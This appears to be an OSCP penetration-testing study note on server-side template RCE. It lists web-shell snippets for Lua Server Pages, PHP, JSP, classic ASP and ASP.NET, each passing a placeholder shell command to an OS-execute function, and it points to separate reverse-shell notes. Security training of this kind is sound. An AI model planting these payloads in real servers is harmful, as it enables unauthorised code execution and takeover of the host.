# Web Template RCE — Server-Side Scripting Engines (OSCP)

When you have write access to a page rendered by a server-side scripting engine, you can inject code that executes on the server.

The pattern is always the same — find the tag syntax, find the OS execute function, drop in your shell command from [[ReverseShells]].

---

## How to Identify the Engine

- Look at existing page content for template tags (`<?lsp ?>`, `<?php ?>`, `<% %>`)
- Check server headers, "powered by" footers, or admin panels
- File extensions: `.php`, `.jsp`, `.asp`, `.aspx`, `.lsp`

---

## Engine Syntax Reference

### LSP — Lua Server Pages
Used by: Barracuda/FuguHub
```
<?lsp os.execute("SHELL_COMMAND") ?>
```
- `<?lsp= expression ?>` — outputs a value to the page (not for execution)
- `<?lsp code ?>` — runs code silently, no output needed for a rev shell

---

### PHP
Used by: Apache, Nginx, most web hosting
```php
<?php system("SHELL_COMMAND"); ?>
```
Also works:
```php
<?php passthru("SHELL_COMMAND"); ?>
<?php exec("SHELL_COMMAND"); ?>
```

---

### JSP — Java Server Pages
Used by: Tomcat, JBoss, GlassFish
```jsp
<% Runtime.getRuntime().exec("SHELL_COMMAND"); %>
```

---

### ASP — Classic ASP (VBScript)
Used by: IIS (older Windows servers)
```asp
<% CreateObject("WScript.Shell").Run("SHELL_COMMAND") %>
```

---

### ASPX — ASP.NET
Used by: IIS (modern Windows servers)
```aspx
<% System.Diagnostics.Process.Start("cmd.exe", "/c SHELL_COMMAND"); %>
```

---

## Related Notes

- [[ReverseShells]]
- [[Web_Enum]]
- [[Msfvenom]]
